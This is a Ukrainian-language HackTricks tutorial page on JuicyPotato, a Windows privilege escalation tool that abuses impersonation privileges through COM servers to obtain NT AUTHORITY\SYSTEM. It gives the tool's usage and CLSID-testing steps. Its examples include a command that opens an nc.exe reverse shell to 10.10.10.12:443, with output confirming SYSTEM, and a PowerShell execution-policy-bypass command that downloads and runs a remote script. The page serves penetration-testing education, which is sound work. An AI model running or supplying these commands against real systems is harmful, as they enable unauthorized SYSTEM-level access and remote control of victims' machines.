# JuicyPotato

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпецівській компанії**? Хочете побачити, як ваша **компанія рекламується на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato не працює** на Windows Server 2019 та Windows 10 з версії 1809 і вище. Однак, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) можуть бути використані для **використання тих самих привілеїв та отримання доступу на рівні `NT AUTHORITY\SYSTEM`**. _**Перевірте:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (зловживання золотими привілеями) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Це підсолений варіант_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, з трохи соку, тобто **інструмент локального підвищення привілеїв, від облікових записів служб Windows до NT AUTHORITY\SYSTEM**_

#### Ви можете завантажити juicypotato з [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Огляд <a href="#summary" id="summary"></a>

**[З Readme juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) та його [варіанти](https://github.com/decoder-it/lonelypotato) використовують ланцюжок підвищення привілеїв на основі служби [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) з MiTM слухачем на `127.0.0.1:6666` та коли у вас є привілеї `SeImpersonate` або `SeAssignPrimaryToken`. Під час перегляду збірки Windows ми виявили налаштування, де `BITS` був навмисно вимкнений, а порт `6666` був зайнятий.

Ми вирішили збройовати [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Привітайте Juicy Potato**.

> Для теорії дивіться [Rotten Potato - Підвищення привілеїв від облікових записів служби до SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) та слідуйте ланцюжку посилань та посилань.

Ми виявили, що, крім `BITS`, існує кілька COM-серверів, які ми можемо зловживати. Їм просто потрібно:

1. бути інстанційованими поточним користувачем, зазвичай "службовим користувачем", який має привілеї імперсонації
2. реалізувати інтерфейс `IMarshal`
3. працювати як підвищений користувач (SYSTEM, Адміністратор, ...)

Після деяких тестів ми отримали та протестували вичерпний список [цікавих CLSID](http://ohpe.it/juicy-potato/CLSID/) на кількох версіях Windows.

### Деталі Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato дозволяє вам:

* **Цільовий CLSID** _виберіть будь-який CLSID, який ви хочете._ [_Тут_](http://ohpe.it/juicy-potato/CLSID/) _ви можете знайти список, організований за ОС._
* **Порт прослуховування COM** _визначте порт прослуховування COM, який вам до вподоби (замість маршалізованого жорстко закодованого 6666)_
* **IP-адреса прослуховування COM** _прив'яжіть сервер до будь-якої IP-адреси_
* **Режим створення процесу** _залежно від привілеїв імперсонації користувача ви можете вибрати з:_
* `CreateProcessWithToken` (потрібно `SeImpersonate`)
* `CreateProcessAsUser` (потрібно `SeAssignPrimaryToken`)
* `обидва`
* **Процес для запуску** _запустіть виконуваний файл або скрипт, якщо експлуатація вдається_
* **Аргумент процесу** _налаштуйте аргументи запущеного процесу_
* **Адреса сервера RPC** _для прихованого підходу ви можете аутентифікуватися на зовнішньому сервері RPC_
* **Порт сервера RPC** _корисно, якщо ви хочете аутентифікуватися на зовнішньому сервері і брандмауер блокує порт `135`..._
* **Режим ТЕСТУВАННЯ** _головним чином для тестування, тобто тестування CLSID. Він створює DCOM та друкує користувача токена. Дивіться_ [_тут для тестування_](http://ohpe.it/juicy-potato/Test/)

### Використання <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Заключні думки <a href="#final-thoughts" id="final-thoughts"></a>

**[З Readme juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**

Якщо у користувача є привілеї `SeImpersonate` або `SeAssignPrimaryToken`, то ви **SYSTEM**.

Практично неможливо запобігти зловживанню всіма цими COM-серверами. Ви можете подумати про зміну дозволів цих об'єктів через `DCOMCNFG`, але вдачі, це буде складно.

Фактичне рішення полягає в захисті чутливих облікових записів та програм, які працюють під обліковими записами `* SERVICE`. Зупинка `DCOM` безперечно унеможливить цей експлойт, але може серйозно вплинути на основну операційну систему.

З: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Приклади

Примітка: Відвідайте [цю сторінку](https://ohpe.it/juicy-potato/CLSID/) для списку CLSID, які можна спробувати.

### Отримати обернену оболонку nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell рев
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Запустіть новий CMD (якщо у вас є доступ RDP)

![](<../../.gitbook/assets/image (37).png>)

## Проблеми з CLSID

Дуже часто, типовий CLSID, який використовує JuicyPotato, **не працює**, і експлойт не вдається. Зазвичай потрібно кілька спроб, щоб знайти **працюючий CLSID**. Щоб отримати список CLSID для спроби на конкретній операційній системі, вам слід відвідати цю сторінку:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Перевірка CLSID**

Спочатку вам знадобляться деякі виконувані файли окрім juicypotato.exe.

Завантажте [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) та завантажте його в сеанс PS, а також завантажте та виконайте [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Цей скрипт створить список можливих CLSID для тестування.

Потім завантажте [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(змініть шлях до списку CLSID та до виконуваного файлу juicypotato) та виконайте його. Він почне спробувати кожен CLSID, і **коли номер порту зміниться, це означатиме, що CLSID працює**.

**Перевірте** працюючі CLSID **за допомогою параметра -c**

## Посилання
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпеці компанії**? Хочете побачити вашу **компанію в рекламі на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
